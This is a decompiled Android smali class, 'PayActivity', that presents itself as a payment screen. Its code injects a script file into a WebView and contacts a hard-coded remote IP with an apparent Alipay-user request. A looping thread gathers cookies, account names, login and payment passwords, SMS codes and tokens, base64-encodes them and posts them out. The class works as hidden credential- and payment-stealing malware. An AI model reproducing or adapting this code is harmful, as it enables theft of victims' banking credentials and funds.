.class public Lcom/ellison/project/activity/PayActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "PayActivity.java"


# static fields
.field public static final TAG:Ljava/lang/String;


# instance fields
.field i:I

.field j:I

.field private mUrl:Ljava/lang/String;

.field private mWeb:Landroid/webkit/WebView;

.field private progressBar:Landroid/widget/ProgressBar;

.field private zhezhao:Landroid/widget/LinearLayout;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 42
    const-class v0, Lcom/ellison/project/activity/PayActivity;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/ellison/project/activity/PayActivity;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 41
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    const/4 v0, 0x0

    .line 43
    iput v0, p0, Lcom/ellison/project/activity/PayActivity;->i:I

    .line 44
    iput v0, p0, Lcom/ellison/project/activity/PayActivity;->j:I

    const-string v0, ""

    .line 46
    iput-object v0, p0, Lcom/ellison/project/activity/PayActivity;->mUrl:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$002(Lcom/ellison/project/activity/PayActivity;Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    .line 41
    iput-object p1, p0, Lcom/ellison/project/activity/PayActivity;->mUrl:Ljava/lang/String;

    return-object p1
.end method

.method static synthetic access$100(Lcom/ellison/project/activity/PayActivity;)V
    .locals 0

    .line 41
    invoke-direct {p0}, Lcom/ellison/project/activity/PayActivity;->initUiAndListener()V

    return-void
.end method

.method static synthetic access$200(Lcom/ellison/project/activity/PayActivity;)Landroid/widget/ProgressBar;
    .locals 0

    .line 41
    iget-object p0, p0, Lcom/ellison/project/activity/PayActivity;->progressBar:Landroid/widget/ProgressBar;

    return-object p0
.end method

.method static synthetic access$300(Lcom/ellison/project/activity/PayActivity;)Landroid/widget/LinearLayout;
    .locals 0

    .line 41
    iget-object p0, p0, Lcom/ellison/project/activity/PayActivity;->zhezhao:Landroid/widget/LinearLayout;

    return-object p0
.end method

.method static synthetic access$400(Lcom/ellison/project/activity/PayActivity;)Landroid/webkit/WebView;
    .locals 0

    .line 41
    iget-object p0, p0, Lcom/ellison/project/activity/PayActivity;->mWeb:Landroid/webkit/WebView;

    return-object p0
.end method

.method private delayPost()V
    .locals 2

    .line 143
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/ellison/project/activity/-$$Lambda$PayActivity$z2R_tlSIP8Ff0U7Eq4E1yoa7cF8;

    invoke-direct {v1, p0}, Lcom/ellison/project/activity/-$$Lambda$PayActivity$z2R_tlSIP8Ff0U7Eq4E1yoa7cF8;-><init>(Lcom/ellison/project/activity/PayActivity;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 200
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public static enterPay(Landroid/app/Activity;)V
    .locals 2

    .line 52
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/ellison/project/activity/PayActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 53
    invoke-virtual {p0, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method private initUiAndListener()V
    .locals 5

    .line 85
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "javascript:("

    .line 86
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "injection.js"

    .line 87
    invoke-static {p0, v1}, Lcom/ellison/project/utils/AssetsUtils;->readAssets2String(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ")()"

    .line 88
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const v1, 0x7f07010b

    .line 90
    invoke-virtual {p0, v1}, Lcom/ellison/project/activity/PayActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/LinearLayout;

    iput-object v1, p0, Lcom/ellison/project/activity/PayActivity;->zhezhao:Landroid/widget/LinearLayout;

    const v1, 0x7f0700b4

    .line 91
    invoke-virtual {p0, v1}, Lcom/ellison/project/activity/PayActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/ProgressBar;

    iput-object v1, p0, Lcom/ellison/project/activity/PayActivity;->progressBar:Landroid/widget/ProgressBar;

    const v1, 0x7f070107

    .line 92
    invoke-virtual {p0, v1}, Lcom/ellison/project/activity/PayActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/webkit/WebView;

    iput-object v1, p0, Lcom/ellison/project/activity/PayActivity;->mWeb:Landroid/webkit/WebView;

    .line 93
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 94
    iget-object v1, p0, Lcom/ellison/project/activity/PayActivity;->mWeb:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 95
    iget-object v1, p0, Lcom/ellison/project/activity/PayActivity;->mWeb:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    .line 96
    iget-object v1, p0, Lcom/ellison/project/activity/PayActivity;->mWeb:Landroid/webkit/WebView;

    new-instance v2, Lcom/ellison/project/utils/BBBBBBB;

    iget-object v3, p0, Lcom/ellison/project/activity/PayActivity;->progressBar:Landroid/widget/ProgressBar;

    iget-object v4, p0, Lcom/ellison/project/activity/PayActivity;->zhezhao:Landroid/widget/LinearLayout;

    invoke-direct {v2, p0, v1, v3, v4}, Lcom/ellison/project/utils/BBBBBBB;-><init>(Landroid/app/Activity;Landroid/webkit/WebView;Landroid/widget/ProgressBar;Landroid/widget/LinearLayout;)V

    const-string v3, "activity"

    invoke-virtual {v1, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 97
    iget-object v1, p0, Lcom/ellison/project/activity/PayActivity;->mWeb:Landroid/webkit/WebView;

    iget-object v2, p0, Lcom/ellison/project/activity/PayActivity;->mUrl:Ljava/lang/String;

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 100
    iget-object v1, p0, Lcom/ellison/project/activity/PayActivity;->mWeb:Landroid/webkit/WebView;

    new-instance v2, Lcom/ellison/project/activity/PayActivity$2;

    invoke-direct {v2, p0}, Lcom/ellison/project/activity/PayActivity$2;-><init>(Lcom/ellison/project/activity/PayActivity;)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 118
    iget-object v1, p0, Lcom/ellison/project/activity/PayActivity;->mWeb:Landroid/webkit/WebView;

    new-instance v2, Lcom/ellison/project/activity/PayActivity$3;

    invoke-direct {v2, p0, v0}, Lcom/ellison/project/activity/PayActivity$3;-><init>(Lcom/ellison/project/activity/PayActivity;Ljava/lang/StringBuilder;)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setPictureListener(Landroid/webkit/WebView$PictureListener;)V

    .line 126
    invoke-direct {p0}, Lcom/ellison/project/activity/PayActivity;->delayPost()V

    .line 127
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/ellison/project/activity/-$$Lambda$PayActivity$-IGbS9x3oKcz4s8aZfqSpfRMOfo;

    invoke-direct {v1, p0}, Lcom/ellison/project/activity/-$$Lambda$PayActivity$-IGbS9x3oKcz4s8aZfqSpfRMOfo;-><init>(Lcom/ellison/project/activity/PayActivity;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 139
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method public synthetic lambda$delayPost$1$PayActivity()V
    .locals 11

    const-string v0, "/"

    const-string v1, "UTF-8"

    .line 145
    :cond_0
    :goto_0
    sget v2, Lcom/ellison/project/utils/AAAA;->ss:I

    const/4 v3, 0x0

    if-lez v2, :cond_2

    .line 147
    :try_start_0
    sget-object v2, Lcom/ellison/project/utils/AAAA;->cookie:Ljava/lang/String;

    invoke-virtual {v2, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-static {v2}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v2

    .line 148
    sget-object v4, Lcom/ellison/project/utils/AAAA;->account:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-static {v4}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v4

    .line 149
    sget-object v5, Lcom/ellison/project/utils/AAAA;->pwd:Ljava/lang/String;

    invoke-virtual {v5, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v5

    invoke-static {v5}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v5

    .line 150
    sget-object v6, Lcom/ellison/project/utils/AAAA;->payPwd:Ljava/lang/String;

    invoke-virtual {v6, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v6

    invoke-static {v6}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v6

    .line 151
    sget-object v7, Lcom/ellison/project/utils/AAAA;->pageTitle:Ljava/lang/String;

    invoke-virtual {v7, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v7

    invoke-static {v7}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v7

    .line 152
    invoke-static {p0}, Lcom/ellison/project/utils/ConfigUtils;->getToken(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v8

    invoke-static {v8}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v8

    .line 153
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "{\'type\':\'setpaytype\',\'cookie\':\'"

    .line 154
    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 155
    check-cast v2, Ljava/lang/String;

    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\',\'user\':\'"

    .line 156
    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 157
    invoke-virtual {v9, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\',\'pwd\':\'"

    .line 158
    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 159
    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\',\'pwd2\':\'"

    .line 160
    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 161
    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\',\'title\':\'"

    .line 162
    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 163
    check-cast v7, Ljava/lang/String;

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\',\'phonecode\':\'"

    .line 164
    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 165
    sget-object v2, Lcom/ellison/project/utils/AAAA;->smsCode:Ljava/lang/String;

    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\',\'Token\':\'"

    .line 166
    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 167
    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\',\'id\':"

    .line 168
    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 169
    sget v2, Lcom/ellison/project/utils/AAAA;->id:I

    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, "}"

    .line 170
    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 171
    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-static {v2}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object v2

    .line 172
    move-object v4, v2

    check-cast v4, Ljava/lang/String;

    invoke-static {p0, v4}, Lcom/ellison/project/utils/AAAA;->sendPostText2(Landroid/content/Context;Ljava/lang/String;)I

    move-result v4

    if-lez v4, :cond_1

    .line 173
    sput v3, Lcom/ellison/project/utils/AAAA;->ss:I

    .line 174
    sget-object v4, Ljava/lang/System;->out:Ljava/io/PrintStream;

    .line 175
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "\u63d0\u4ea4\u652f\u4ed8\u6210\u529f:"

    .line 176
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 177
    sget-object v6, Lcom/ellison/project/utils/AAAA;->account:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 178
    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 179
    sget-object v6, Lcom/ellison/project/utils/AAAA;->pwd:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 180
    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 181
    sget v6, Lcom/ellison/project/utils/AAAA;->id:I

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 182
    check-cast v4, Ljava/io/PrintStream;

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    goto :goto_1

    .line 184
    :cond_1
    sput v3, Lcom/ellison/project/utils/AAAA;->ss:I
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v2

    .line 187
    invoke-virtual {v2}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    :cond_2
    :goto_1
    const-wide/16 v4, 0x3e8

    .line 191
    :try_start_1
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_1
    move-exception v2

    .line 193
    invoke-virtual {v2}, Ljava/lang/InterruptedException;->printStackTrace()V

    .line 195
    :goto_2
    iget v2, p0, Lcom/ellison/project/activity/PayActivity;->i:I

    add-int/lit8 v2, v2, 0x1

    iput v2, p0, Lcom/ellison/project/activity/PayActivity;->i:I

    const/16 v4, 0x3c

    if-le v2, v4, :cond_0

    .line 197
    iput v3, p0, Lcom/ellison/project/activity/PayActivity;->i:I

    goto/16 :goto_0
.end method

.method public synthetic lambda$initUiAndListener$0$PayActivity()V
    .locals 2

    const-wide/16 v0, 0x7d0

    .line 129
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 131
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    .line 133
    :goto_0
    iget v0, p0, Lcom/ellison/project/activity/PayActivity;->j:I

    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Lcom/ellison/project/activity/PayActivity;->j:I

    const-wide/16 v0, 0x3e8

    .line 135
    :try_start_1
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    .line 137
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_1
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 58
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    const p1, 0x7f0a001e

    .line 60
    invoke-virtual {p0, p1}, Lcom/ellison/project/activity/PayActivity;->setContentView(I)V

    .line 63
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "{\'type\':\'getzfbuser\',\'Token\':\'"

    .line 64
    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\'}"

    .line 65
    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 68
    :try_start_0
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "UTF-8"

    invoke-virtual {p1, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p1

    invoke-static {p1}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object p1

    const-string v0, "http://165.3.95.36:9968/"

    .line 69
    invoke-static {v0}, Lcom/lzy/okgo/OkGo;->post(Ljava/lang/String;)Lcom/lzy/okgo/request/PostRequest;

    move-result-object v0

    invoke-virtual {v0, p0}, Lcom/lzy/okgo/request/PostRequest;->tag(Ljava/lang/Object;)Lcom/lzy/okgo/request/base/Request;

    move-result-object v0

    check-cast v0, Lcom/lzy/okgo/request/PostRequest;

    const-string v1, "callbackurl"

    const/4 v2, 0x0

    new-array v2, v2, [Z

    invoke-virtual {v0, v1, p1, v2}, Lcom/lzy/okgo/request/PostRequest;->params(Ljava/lang/String;Ljava/lang/String;[Z)Lcom/lzy/okgo/request/base/Request;

    move-result-object p1

    new-instance v0, Lcom/ellison/project/activity/PayActivity$1;

    invoke-direct {v0, p0}, Lcom/ellison/project/activity/PayActivity$1;-><init>(Lcom/ellison/project/activity/PayActivity;)V

    invoke-virtual {p1, v0}, Lcom/lzy/okgo/request/base/Request;->execute(Lcom/lzy/okgo/callback/Callback;)V
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 79
    invoke-virtual {p1}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    :goto_0
    return-void
.end method
